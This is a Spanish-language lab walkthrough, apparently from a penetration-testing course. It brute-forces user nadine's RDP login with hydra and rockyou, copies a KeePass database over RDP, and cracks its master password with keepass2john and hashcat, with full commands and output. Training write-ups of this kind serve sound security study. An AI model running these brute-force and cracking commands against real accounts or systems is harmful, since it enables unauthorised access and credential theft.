# Walk: Password Attacks - Password Manager - VM #2

## Fecha: 24/02/2025
## Host: Windows
## IP: 192.168.155.227
## Objetivo
Enumerate VM #2 and get access to the system as user _nadine_. Obtain the password stored as title "flag" in the password manager and enter it as answer to this exercise. Note that the flag is not formatted as **OS{}** for this exercise.
## Herramientas
1. nmap
2. hydra
3. xfreerdp
4. keepass2john
## Procedimiento y comandos
#### Paso 1: Obtener credenciales del usuario _nadine_
>Ataque de diccionario con hydra
- ` hydra -t 4 -V -l nadine -P /usr/share/wordlists/rockyou.txt rdp://192.168.155.227`
```
[ATTEMPT] target 192.168.155.227 - login "nadine" - pass "batman" - 199 of 14344399 [child 1] (0/0)
[RE-ATTEMPT] target 192.168.155.227 - login "nadine" - pass "martin" - 199 of 14344399 [child 0] (0/0)
[3389][rdp] host: 192.168.155.227   login: nadine   password: 123abc
[ERROR] freerdp: The connection failed to establish.
1 of 1 target successfully completed, 1 valid password found
```
- [3389][rdp] host: 192.168.155.227   login: nadine   password: **123abc**
#### Paso 2: Obtener KeePass:
1. Una vez conectados por rdp con el usuario _nadine_
`xfreerdp /v:192.168.155.227 /u:nadine /p:123abc +clipboard /cert:ignore /drive:/tmp`
2. Obtenemos el archivo **Database.kdbx**
3. Utilizamos **keepass2john** para formatear el archivo y guardarlo en un **_.hash_**
`keepass2sjohn Database.kdbx > keepass.hash`
4. Editamos el archivo quitando _**"Database:"**_
5. Obtenemos el modo para ejecutar **hashcat**
`hashcat -h | grep "KeePass"`
```
13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) | Password Manager
```
6. Ejecutamos **hashcat** para obtener el keepass:
`hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force`
```
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 430331550000

$keepass$*2*1*0*b1a85c5029830d00eead372eff9b2c0c5f2b78d8adf6090568429ba7b9622f25*27ab0d96aaacbb427dc6e9746fcf5148a468d042855186d3d1409d40ca018fa1*2eb108ae671a4aebcfa4217b5dcdccdc*ea47adcf48185eb7d670b25a3b2f8a535eb72339bbdf2e0d05c892bad22287f0*e250173255fbe9861707502ebef385c839fd328dac2f7874ff3b0bfc13cf4b56:pinkpanther1234
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13400 (KeePass 1 (AES/Twofish) and KeePass 2 (AES))
Hash.Target......: $keepass$*2*1*0*b1a85c5029830d00eead372eff9b2c0c5f2...cf4b56
Time.Started.....: Mon Feb 24 18:08:03 2025, (1 sec)
Time.Estimated...: Mon Feb 24 18:08:04 2025, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/rockyou-30000.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   566.2 kH/s (1.47ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 401408/430331550000 (0.00%)
Rejected.........: 0/401408 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:48-49 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 1234561234 -> whitetiger1234
Hardware.Mon.#1..: Temp: 56c Util: 28%

```
> KeePass : **pinkpanther1234**
#### Paso 3: Obtenemos el flag
1. Colocamos el keepass para acceder al administrador de contrasenas y obtenemos el flag:
> **eSG**********************BWK**
